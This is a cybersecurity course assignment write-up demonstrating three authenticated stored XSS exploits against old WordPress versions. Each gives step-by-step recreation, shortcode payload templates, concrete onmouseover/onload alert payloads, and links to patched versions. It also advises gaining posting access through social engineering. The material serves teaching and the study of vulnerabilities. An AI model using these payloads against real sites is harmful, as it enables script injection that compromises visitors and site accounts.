# Cybersecurity University: Week 7 Assignment
Assignment: Identify and demonstrate POCs for at least 3 exploits affecting older versions of WordPress.

**Exploits demonstrated**:
* [CVE 2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622) / [CVE 2015-5623](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623): Authenticated Stored Cross-Site Scripting (XSS)
* [CVE 2015-5714](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714): Authenticated Shortcode Tags Cross-Site Scripting (XSS)
* [CVE 2017-6817](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817): Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds

## #1: Authenticated Stored Cross-Site Scripting (XSS)

This exploit requires an attacker to have an account with posting capabilities (i.e. a minimum of Contributor level permissions). In this vulnerability, an attacker can insert arbitrary Javascript via a specially-crafted shortcode onto a page or a post.

### Recreating the Exploit
1. Gain access to an account with at least posting-level permissions via social engineering or another exploit. (Alternatively, if the site allows unauthenticated users to post via some special configuration, then an account is not needed.)
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor (not the Visual editor) to insert code similar to the following and post:

```
<a href="[caption code=">]</a><a title=" <Event-attribute-with-JS-code-here>  ">link</a>
```
which WP processes to:
```
<a href="</a><a title=" <Event-attribute-with-JS-code-here> ">link</a>
```

### Example
If an attacker puts in the following:
```
<a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">link</a>
```
WP processes this to become:
```
<a href="</a><a title=" onmouseover=alert('XSS!') ">link</a>
```
Here, the closing of the first `a` tag and the opening of the second `a` tag are caught up in the first `a` tag's `href` attribute, which means that the first `a` tag now has an `href` attribute **and** an `onmouseover` attribute (the latter of which executes our JS code). So, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS." Of course, one could replace this JS code with something far more malicious.

### Demonstration

The following video demonstrates this exploit: https://youtu.be/UWHUU_pFlb8

### Other Details
* **CVEs**: 2015-5622 and 2015-5623
* **Type**: XSS
* **Affects**: WordPress <=4.2.2
* **Patched**: WordPress 4.2.3

## #2: Authenticated Shortcode Tags XSS

Like the last one, this vulnerability also requires the attacker to have an account with posting capabilities. It takes advantage of a shortfall in WordPress's KSES filtering (which filters out non-whitelisted HTML tags). 

### Recreating the Exploit
1. Gain access to an account with at least posting-level permissions via social engineering or another exploit. (Alternatively, if the site allows unauthenticated users to post via some special configuration, then an account is not needed.)
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor (not the Visual editor) to insert code similar to the following and post:

```
[caption width="1" caption='<a href="' ">]</a><a href=" <Event-attribute-with-JS-code-here> ">Click me!</a>
```
which WP processes to:
```
<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" <Event-attribute-with-JS-code-here> ">Click me</a>
```

### Example
If an attacker puts in the following:
```
[caption width="1" caption='<a href="' ">]</a><a href=" onmouseover='alert("XSS!")' ">Click me!</a>
```
WP processes this to become:
```
<figcaption class="wp-caption-text"><a href="</figcaption></figure></a><a href=" onmouseover='alert("XSS!")' ">Click me</a>
```
Here, the closing of the first `a` tag, the `figcaption` tag, and the `figure` tag are all caught up in the first `a` tag's `href` attribute, which means that the first `a` tag now has an `href` attribute **and** an `onmouseover` attribute (the latter of which executes our JS code). (The `figcaption` tag that was opened at the beginning is left hanging.) Thus, like the last vulnerability, when the post/page is opened and a user mouses over this (fake) link, the browser shows an alert box with the word "XSS."

### Demonstration

The following video demonstrates this exploit: https://www.youtube.com/watch?v=q9XJsXixbcE

### Other Details
* **CVE**: 2015-5714
* **Type**: XSS
* **Affects**: WordPress <=4.3
* **Patched**: WordPress 4.3.1

## #3: Authenticated Stored XSS in YouTube URL Embeds

Again, this vulnerability requires at least Contributor level privileges onto the site. Through this exploit, an attacker could take advantage of YouTube URL embeds to achieve a **stored/persistent** XSS attack that can affect any user who loads the compromised page.

### Recreating the Exploit
1. Gain access to an account with at least posting-level permissions via social engineering or another exploit. (Alternatively, if the site allows unauthenticated users to post via some special configuration, then an account is not needed.)
2. Either create a new page/post or modify an existing one.
3. Use the HTML editor (not the Visual editor) to insert code similar to the following and post. **Here, we demonstrate the vulnerability through the use of an embed shortcode**:

```
[embed src='https://www.youtube.com/embed/12345\x3csvg <Event-attribute-with-JS-code-here>\x3e'][/embed]
```
which WP processes to:
```
<p>https://youtube.com/watch?v=12345<svg <Event-attribute-with-JS-code-here>></p>
```

### Example
If an attacker puts in the following:
```
[embed src='https://www.youtube.com/embed/12345\x3csvg onload=alert("XSS!")\x3e'][/embed]
```
WP processes this to become:
```
<p>https://youtube.com/watch?v=12345<svg onload=alert("XSS!")></p>
```
Here, the opening and closing `p` tags surround **2** elements: Some text (`https://youtube.com/watch?v=12345`) and an SVG container (`<svg onload=alert("XSS!")>`). The browser loads this empty SVG container whose only attribute is an `onload` event attribute (which is executed automatically when the page loads). Thus, as soon as the compromised post/page loads, the browser shows an alert box with the word "XSS."

### Demonstration

The following video demonstrates this exploit: https://www.youtube.com/watch?v=YuqVKOiPfTU

### Other Details
* **CVE**: 2017-6817
* **Type**: XSS
* **Affects**: WordPress <=4.7.2
* **Patched**: WordPress 4.7.3
